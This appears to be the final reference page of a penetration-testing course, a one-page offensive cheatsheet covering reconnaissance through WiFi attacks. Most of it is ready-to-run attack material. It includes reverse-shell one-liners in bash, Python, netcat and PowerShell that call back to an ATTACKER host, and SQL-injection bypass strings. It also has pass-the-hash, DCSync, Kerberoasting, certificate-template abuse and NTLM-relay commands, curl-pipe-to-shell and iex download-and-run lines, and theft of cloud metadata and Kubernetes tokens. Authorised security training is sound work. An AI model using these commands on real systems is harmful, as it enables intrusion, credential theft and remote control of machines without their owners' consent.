---
title: "Master cheatsheet"
area: "Reference"
order: 29
level: "intermediate"
summary: "The quick reference page: commands you will always use, typical payloads, network/web/AD/cloud/forensics one-liners. Bookmark it and consult it while you work."
prereq:
  - "All sections"
tools:
  - "All previous ones"
---

# Master cheatsheet

> One page, dense, navigable. To consult while you work.

## Reconnaissance

```bash
# OSINT subdomains
subfinder -d example.com -all -silent > subs.txt
amass enum -passive -d example.com >> subs.txt
curl -s "https://crt.sh/?q=%25.example.com&output=json" | jq -r '.[].name_value' | sort -u >> subs.txt
sort -u -o subs.txt subs.txt

# Live host check
httpx -l subs.txt -title -tech-detect -status-code -o live.txt

# Tech stack
whatweb https://target
wafw00f https://target
nuclei -u https://target -t technologies/

# Shodan / Censys
shodan search 'org:"Target Inc" port:443'
```

## Scanning

```bash
# classic nmap
nmap -sV -sC -p- --min-rate 1000 -T4 -oA out target

# masscan + nmap
sudo masscan -p1-65535 10.0.0.0/16 --rate 10000 -oL ports.txt
awk '/open/{print $4}' ports.txt | sort -u > hosts.txt
nmap -sV -sC -iL hosts.txt -oA nmap

# UDP top 100
sudo nmap -sU --top-ports 100 -sV target

# Light vulnerability scan
nmap --script vuln target
nuclei -l live.txt -severity high,critical

# Web content discovery
ffuf -u https://target/FUZZ -w SecLists/Discovery/Web-Content/big.txt -e .php,.bak,.json -mc 200,301,302,401,403
gobuster dir -u https://target -w big.txt -t 50 -k
feroxbuster -u https://target -w big.txt -d 4
```

## Web exploitation

```bash
# Automatic SQLi
sqlmap -u "https://target/x?id=1" --batch --random-agent --level=3 --risk=2

# XSS quick check
echo '<script>alert(1)</script>' | xclip      # keep in clipboard
# then try every parameter

# JWT
jwt_tool TOKEN -M at
jwt_tool TOKEN -C -d wordlist.txt              # crack HS256
hashcat -m 16500 jwt.txt rockyou.txt

# Common auth bypass payloads
admin' --
admin' OR '1'='1
admin'/*

# SSRF AWS metadata
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/  # IMDSv1
```

## Reverse shell payloads (bash)

```bash
# bash
bash -i >& /dev/tcp/ATTACKER/4444 0>&1
exec 5<>/dev/tcp/ATTACKER/4444; cat <&5 | while read line; do $line 2>&5 >&5; done

# python
python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("ATTACKER",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'

# nc (varies by version)
nc -e /bin/sh ATTACKER 4444                    # GNU netcat
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc ATTACKER 4444 >/tmp/f   # busybox

# PowerShell
powershell -nop -c "$c=New-Object System.Net.Sockets.TCPClient('ATTACKER',4444);$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length)) -ne 0){;$d=(New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0,$i);$sb=(iex $d 2>&1|Out-String);$sbB=([text.encoding]::ASCII).GetBytes($sb + 'PS '+(pwd).Path+'> ');$s.Write($sbB,0,$sbB.Length);$s.Flush()};$c.Close()"

# Upgrade dumb shell
python3 -c 'import pty;pty.spawn("/bin/bash")'
# Ctrl-Z
stty raw -echo; fg
export TERM=xterm
```

Catcher:
```bash
nc -lvnp 4444
rlwrap nc -lvnp 4444         # with line editing
pwncat-cs -lp 4444           # pwncat (modern)
```

## Linux privesc

```bash
# Quick checks
sudo -l
find / -perm -4000 -type f 2>/dev/null            # SUID
getcap -r / 2>/dev/null                            # capabilities
crontab -l ; ls -la /etc/cron.* /etc/cron.d/
mount                                              # NFS no_root_squash?
cat /etc/passwd | grep ':0:'                        # UID 0 besides root?

# Automated LinPEAS
curl -sL https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh | sh

# Container escape check
ls /.dockerenv
cat /proc/1/cgroup | grep -E "docker|kubepods"
```

## Windows privesc

```powershell
# From PowerShell
whoami /priv
whoami /groups

# WinPEAS
iex (new-object net.webclient).downloadstring('https://raw.githubusercontent.com/peass-ng/PEASS-ng/master/winPEAS/winPEASps1/winPEAS.ps1')

# PowerUp / Seatbelt / SharpUp
Invoke-PrivescAudit
.\Seatbelt.exe -group=all
.\SharpUp.exe audit

# Token privileges
whoami /priv
# SeImpersonatePrivilege -> Potato attacks
```

## Active Directory

```bash
# Recon (Linux)
bloodhound-python -d example.local -u alice -p Password1 -c all -ns 10.10.10.1
nxc smb 10.10.10.0/24 -u users.txt -p passwords.txt --continue-on-success

# AS-REP roast
GetNPUsers.py -dc-ip 10.10.10.1 example.local/ -usersfile users.txt -no-pass -format hashcat -outputfile asrep.txt
hashcat -m 18200 asrep.txt rockyou.txt

# Kerberoast
GetUserSPNs.py example.local/alice:Password1 -dc-ip 10.10.10.1 -request -outputfile spn.txt
hashcat -m 13100 spn.txt rockyou.txt

# Pass-the-Hash
nxc smb DC01 -u Administrator -H aad3b435...
psexec.py -hashes :NTHASH Administrator@10.10.10.5
wmiexec.py -hashes :NTHASH Administrator@10.10.10.5

# DCSync
secretsdump.py example.local/admin:Pass@dc01 -just-dc-ntlm

# ADCS Cert (Certipy)
certipy find -u alice@example.local -p Pass -dc-ip 10.10.10.1 -vulnerable -stdout
certipy req -u alice -p Pass -ca CA-NAME -template Vuln -upn administrator@example.local
certipy auth -pfx administrator.pfx

# Responder + relay
sudo responder -I eth0 -wv
sudo ntlmrelayx.py -tf targets.txt -smb2support
sudo mitm6 -d example.local --no-ra
```

## Pivoting

```bash
# SSH dynamic (SOCKS5)
ssh -D 1080 user@pivot
# proxychains.conf: socks5 127.0.0.1 1080
proxychains nmap -sT -Pn 10.10.50.0/24

# chisel reverse SOCKS
# attacker:
./chisel server -p 8000 --reverse
# compromised host:
./chisel client http://attacker:8000 R:1080:socks

# ligolo-ng (tun)
./proxy -selfcert
./agent -connect attacker:11601 -ignore-cert
# attacker:
sudo ip route add 10.10.50.0/24 dev ligolo
```

## File transfer

```bash
# Quick HTTP server
python3 -m http.server 8000

# scp / rsync
scp -i key.pem file user@host:/tmp/
rsync -avzP -e "ssh -i key.pem" src/ user@host:/dst/

# Windows from Linux
smbserver.py share .          # impacket smb server
# from Windows: copy \\attacker\share\file.exe .

# certutil (Windows LOLBin)
certutil -urlcache -split -f http://attacker/file.exe c:\file.exe

# powershell download
iwr http://attacker/file -OutFile c:\f.exe
(New-Object Net.WebClient).DownloadFile("http://attacker/file","c:\f.exe")

# linux
curl http://attacker/file -o file
wget http://attacker/file
```

## Cracking

```bash
# Hashcat modes (selection)
# 1000  NTLM
# 1800  sha512crypt
# 5500  NetNTLMv1
# 5600  NetNTLMv2
# 13100 Kerberos TGS-REP (RC4)
# 18200 Kerberos AS-REP (RC4)
# 16500 JWT HS256
# 22000 WPA-PBKDF2 / PMK / PMKID
# 1400  SHA256
# 100   SHA1
# 0     MD5
# 1700  SHA512
# 2500  WPA-EAPOL (legacy)
# 3200  bcrypt
hashcat -m MODE -a 0 hash.txt rockyou.txt
hashcat -m MODE -a 3 hash.txt ?a?a?a?a?a?a?a       # mask
```

## Forensics quick

```bash
# Memory
vol -f mem.dmp windows.pslist
vol -f mem.dmp windows.malfind
vol -f mem.dmp windows.netscan
vol -f mem.dmp windows.cmdline

# Timeline
log2timeline.py --storage_file out.plaso /mnt/evidence
psort.py -o l2tcsv out.plaso > timeline.csv

# Windows registry
RECmd.exe --bn batch.reb -d D:\Recovery\

# Sigma -> SIEM
sigma convert -t splunk -p windows-audit rule.yml
```

## Crypto quick

```bash
# Hash
echo -n "data" | sha256sum
openssl dgst -sha256 file

# AES
openssl enc -aes-256-cbc -pbkdf2 -salt -in pt -out ct -pass pass:foo
openssl enc -aes-256-cbc -pbkdf2 -d -in ct -out pt -pass pass:foo

# RSA
openssl genrsa -out priv.pem 4096
openssl rsa -in priv.pem -pubout -out pub.pem
openssl rsautl -encrypt -pubin -inkey pub.pem -in pt -out ct       # legacy
openssl pkeyutl -encrypt -pubin -inkey pub.pem -in pt -out ct

# Generate random
openssl rand -hex 32
openssl rand -base64 32

# TLS analysis
openssl s_client -connect host:443 -servername host -showcerts
testssl.sh https://host
nmap --script ssl-enum-ciphers -p 443 host
```

## Cloud quick

```bash
# AWS
aws sts get-caller-identity
aws iam list-attached-user-policies --user-name alice
aws s3 ls
aws s3 ls s3://bucket --no-sign-request

# Azure
az account show
az ad signed-in-user show

# GCP
gcloud auth list
gcloud projects list
gcloud iam service-accounts list

# Prowler (multi-cloud audit)
prowler aws -o csv,html
```

## Container / K8s

```bash
# docker
docker ps -a
docker inspect <id> | jq '.[].Config.Env'

# K8s recon inside a pod
TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
curl -k -H "Authorization: Bearer $TOKEN" https://kubernetes.default/api/v1/namespaces
kubectl auth can-i --list
```

## WiFi

```bash
sudo airmon-ng check kill
sudo airmon-ng start wlan0
sudo airodump-ng wlan0mon
sudo airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w cap wlan0mon
sudo aireplay-ng -0 5 -a AP_MAC wlan0mon
hcxpcapngtool -o hash.hc22000 cap.cap
hashcat -m 22000 hash.hc22000 rockyou.txt
```

## "Swiss army knife" tools

```bash
# Burp shortcuts (browser proxied via 127.0.0.1:8080)
# Intercept on/off: Ctrl+I
# Send to repeater: Ctrl+R
# Send to intruder: Ctrl+I (in Burp 2024+)

# CyberChef (web): convert/encode/decode almost anything, drag-drop.

# httpie as a curl alternative
http POST https://api/x token==xxx name=alice

# fzf interactive
history | fzf
```

## Quick sniff (to remember)

```bash
sudo tcpdump -i any -nn -v 'tcp port 80 or tcp port 443'
sudo tcpdump -i any -nn -v -w cap.pcap host 1.2.3.4
sudo tshark -i any -Y "http.request" -T fields -e ip.src -e http.host -e http.request.uri
```

## Addresses and numbers to memorize

- `127.0.0.1`, `::1` loopback.
- `169.254.169.254` AWS/Azure IMDS (Google: `metadata.google.internal` or `169.254.169.254`).
- `0.0.0.0` "all interfaces", default route.
- `255.255.255.255` broadcast.
- `169.254.0.0/16` link-local APIPA.
- RFC1918: 10/8, 172.16/12, 192.168/16.
- Multicast 224/4.
- Linux syscall numbers: `read=0`, `write=1`, `open=2`, `close=3`, `execve=59`, `mmap=9`, `socket=41`, `connect=42`, `ptrace=101` (x86-64).
- HTTP status: 200 OK, 301/302/303/307/308 redirect, 401 unauth, 403 forbid, 404, 429 rate limit, 500 server, 502 bad gateway, 503 unavail, 504 timeout.
- ASCII: `0x20` space, `0x0a` newline, `0x0d` CR, `0x00` null.

## Emergency resources (when you're stuck)

- [HackTricks](https://book.hacktricks.xyz) — "the bible". Search here first.
- [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings) — payloads by category.
- [GTFOBins](https://gtfobins.github.io) — escapes from Unix binaries.
- [LOLBAS](https://lolbas-project.github.io) — Windows LOLBins.
- [HackTricks Cloud](https://cloud.hacktricks.xyz).
- [Internal All-The-Things](https://swisskyrepo.github.io/InternalAllTheThings/) — AD/internal pentest.
- [Sigma rules](https://github.com/SigmaHQ/sigma).
- [Atomic Red Team](https://atomicredteam.io).
- [MITRE ATT&CK](https://attack.mitre.org).
- [Cyber Chef](https://gchq.github.io/CyberChef/) — encoding swiss army.

Save them in your bookmarks. Search them before asking anyone else.

---

You've closed the loop. Now don't read another 100 pages — **do**.
